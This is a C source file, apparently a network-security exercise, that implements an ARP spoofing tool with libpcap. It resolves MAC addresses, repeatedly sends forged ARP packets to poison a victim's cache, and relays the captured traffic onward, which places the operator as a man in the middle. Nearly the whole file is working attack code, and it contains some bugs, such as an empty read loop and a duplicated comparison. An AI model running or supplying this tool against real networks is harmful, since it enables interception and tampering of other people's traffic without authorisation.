#include <pcap.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#define ETHER_ADDR_LEN 6
#define IP_LEN 4
#define ARP_LEN 42
#define ARPOP_REQUEST 0x01
#define ARPOP_REPLY 0x02
#define ARPHRD_ETHER 0X01
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP  0X0806

struct ethernet_hdr
        {
          u_int8_t ether_dhost[ETHER_ADDR_LEN];
          u_int8_t ether_shost[ETHER_ADDR_LEN];
          u_int16_t ether_type;
        };

struct arp_hdr
        {
          u_int16_t HardwareType;
          u_int16_t ProtocolType;
          u_int8_t HardwareSize;
          u_int8_t ProtocolSize;
          u_int16_t Opcode;
          u_int8_t SenderMacAdd[ETHER_ADDR_LEN];
          u_int8_t SenderIpAdd[IP_LEN];
          u_int8_t TargetMacAdd[ETHER_ADDR_LEN];
          u_int8_t TargetIpAdd[IP_LEN];
        };

struct ipv4_hdr
	{
	  u_int8_t IPverIHL;
	  u_int8_t TOS;
	  u_int16_t IPLen;
	  u_int16_t PacketID;
	  u_int16_t IPFlag;
	  u_int8_t TTL;
	  u_int8_t ProtocolType;
	  u_int16_t IPHeaderChecksum;
	  u_int8_t SIP[IP_LEN];
	  u_int8_t DIP[IP_LEN];
	};

int get_my_ipadd(const char *dev, u_int8_t *ip)
{
  char buf[100];
  FILE *fp;
  fp=popen("hostname -I","r");
  if(fp==NULL)
    return -1;
  while(fgets(buf,sizeof(buf),fp))

  pclose(fp);
  sscanf(buf,"%u.%u.%u.%u",ip,ip+1,ip+2,ip+3);

  return 0;
}

int send_req(pcap_t *handle, u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *send_ip, u_int8_t *target_ip, u_int8_t *buf, int request_flag)
{
  struct ethernet_hdr *ether=(struct ethernet_hdr *)buf;
  struct arp_hdr *arp=(struct arp_hdr *)(ether+1);
  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
  {
    ether->ether_dhost[i]=dst_mac[i];
    ether->ether_shost[i]=src_mac[i];
  }
  ether->ether_type=htons(ETHERTYPE_ARP);
  arp->HardwareType=htons(ARPHRD_ETHER);
  arp->ProtocolType=htons(ETHERTYPE_IP);
  arp->HardwareSize=ETHER_ADDR_LEN;
  arp->ProtocolSize=IP_LEN;
  arp->Opcode=htons(ARPOP_REQUEST);

  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
  {
    arp->SenderMacAdd[i]=src_mac[i];
    (request_flag==0)?(arp->TargetMacAdd[i]=0x00):(arp->TargetMacAdd[i]=dst_mac[i]);
  }

  for(u_int8_t i=0;i<IP_LEN;i++)
  {
    arp->SenderIpAdd[i]=send_ip[i];
    arp->TargetIpAdd[i]=target_ip[i];
  }

  pcap_sendpacket(handle,buf,ARP_LEN);
  
  printf("success\n");
  if(pcap_sendpacket(handle,buf,ARP_LEN)==-1)
  {
	printf("ARP request fail");
	return -1;
  }

  return 1;
}
 
int recv_reply(pcap_t *handle, u_int8_t *sender_ip, u_int8_t *target_ip, u_int8_t *victim_mac, int recover_flag, u_int16_t *packet_size)
{
  int reply_flag=0;
  u_int8_t broadcastmac[ETHER_ADDR_LEN]={0XFF,0XFF,0XFF,0XFF,0XFF,0XFF};

  for(u_int8_t i=0;;i++)
  {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    struct ethernet_hdr *ether=(struct ethernet_hdr *)packet;
   
    if(htons(ether->ether_type)==ETHERTYPE_ARP)
    {
	  struct arp_hdr *arp=(struct arp_hdr *)(ether+1);
	  if(arp->Opcode==htons(ARPOP_REPLY))
	  {
		if((arp->SenderIpAdd[0]==sender_ip[0]) && (arp->SenderIpAdd[1]==sender_ip[1]) && (arp->SenderIpAdd[2]==sender_ip[2]) && (arp->SenderIpAdd[3]==sender_ip[3]))
		{
		  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
		  victim_mac[i]=arp->SenderMacAdd[i];
		}
		  reply_flag=1;
	  }

	  if(arp->Opcode==htons(ARPOP_REQUEST))
	  {
		if((arp->TargetMacAdd[0]==broadcastmac[0]) && (arp->TargetMacAdd[1]==broadcastmac[1])  && (arp->TargetMacAdd[2]==broadcastmac[2]) && (arp->TargetMacAdd[2]==broadcastmac[2]))
		{
		  recover_flag=0;
		  reply_flag=2;
		}
	  }
    }

    else if(htons(ether->ether_type)==ETHERTYPE_IP)
    {
	struct ipv4_hdr *ip=(struct ipv4_hdr *)(ether+1);
	if((ip->DIP[0]==target_ip[0]) && (ip->DIP[1]==target_ip[1]) && (ip->DIP[2]==target_ip[2]) && (ip->DIP[3]==target_ip[3]))
	  *packet_size=ip->IPLen;
	  printf("ip->IPLen:%d\n",ip->IPLen);
	  printf("packet size:%d\n",*packet_size);
	  recover_flag=1;
	  reply_flag=3;
    }

    if(reply_flag==1)
    {
      printf("SMA:%X:%X:%X:%X:%X:%X\n",victim_mac[0],victim_mac[1],victim_mac[2],victim_mac[3],victim_mac[4],victim_mac[5]);
      break;
    }
    else if(reply_flag==2)
    {
      printf("Victim recovered\n");
      break;
    }
    else if(reply_flag==3)
    {
      printf("Relaying\n");
      break;
    }

  }

  return 1;
}

int send_relay(pcap_t *handle, u_int8_t *packet, u_int16_t *packet_size, u_int8_t *my_mac, u_int8_t *target_mac)
{
  struct ethernet_hdr *eth=(struct ethernet_hdr *)packet;
	for (u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
	{
		eth->ether_dhost[i]=target_mac[i];
		eth->ether_shost[i]=my_mac[i];
	}
	pcap_sendpacket(handle,packet,*packet_size);
	printf("sent relay packet\n");
	return 1;
}

void usage() {
  printf("syntax: arp_spoofing <interface> <sender ip> <target ip>\n");
  printf("sample: arp_spoofing eth0 172.20.10.5 172.20.10.2\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }
  int request_flag=0;
  int recover_flag=0;
  u_int16_t packet_size;
  u_int8_t broadcastmac[ETHER_ADDR_LEN]={0XFF,0XFF,0XFF,0XFF,0XFF,0XFF};
  u_int8_t my_mac[ETHER_ADDR_LEN];
  u_int8_t my_ip[IP_LEN];
  u_int8_t victim_mac[ETHER_ADDR_LEN];
  u_int8_t target_mac[ETHER_ADDR_LEN];
  u_int8_t sender_ip[IP_LEN];
  u_int8_t target_ip[IP_LEN];
  u_int8_t buf[ARP_LEN];
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  inet_pton(AF_INET,argv[2],sender_ip);
  inet_pton(AF_INET,argv[3],target_ip);
  get_my_ipadd(dev,my_ip);
  
  u_int8_t sock=socket(AF_INET,SOCK_DGRAM,0);
  struct ifreq ifr;
  memset(&ifr,0X00,sizeof(ifr));
  strncpy(ifr.ifr_name,dev,IFNAMSIZ-1);
  u_int8_t fd=socket(AF_INET,SOCK_DGRAM,0);
  if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0)
    perror("ioctl ");
  for(int i=0;i<6;i++)
  my_mac[i]=(u_int8_t)ifr.ifr_hwaddr.sa_data[i];
  close(sock);

	send_req(handle, my_mac, broadcastmac, my_ip, target_ip, buf, request_flag);
	recv_reply(handle, my_ip, target_ip, target_mac, recover_flag, &packet_size);
	request_flag=0;
	send_req(handle, my_mac, broadcastmac, my_ip, sender_ip, buf, request_flag);
	recv_reply(handle, sender_ip, target_ip, victim_mac, recover_flag, &packet_size);
	request_flag=1;

  while(1)
  {
	send_req(handle, my_mac, victim_mac, target_ip, sender_ip, buf, request_flag);

	struct pcap_pkthdr* header;
	const u_char* packet;
	int res = pcap_next_ex(handle, &header, &packet);
	if (res == 0) continue;
	if (res == -1 || res == -2) break;

	recover_flag=1;

  	while(1)
  	{
    		recv_reply(handle, sender_ip, target_ip, victim_mac, recover_flag, &packet_size);
		if(recover_flag==0)
			break;
    		send_relay(handle, (u_int8_t *)packet, &packet_size, my_mac, target_mac);
  	}
  }
  
  pcap_close(handle);

  return 0;
}

